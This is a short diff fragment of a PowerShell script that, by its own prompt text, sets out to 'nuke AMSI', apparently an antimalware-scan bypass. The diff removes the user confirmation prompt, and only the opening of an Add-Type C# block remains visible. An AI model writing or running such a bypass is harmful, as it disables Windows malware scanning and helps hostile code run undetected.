@@ -1,6 +1,3 @@
-# Prompt the user for confirmation
-$confirmation = Read-Host "Are you ready to nuke AMSI from this shell? Press Enter to continue"
-
 Add-Type -TypeDefinition @"
 using System;
 using System.Diagnostics;
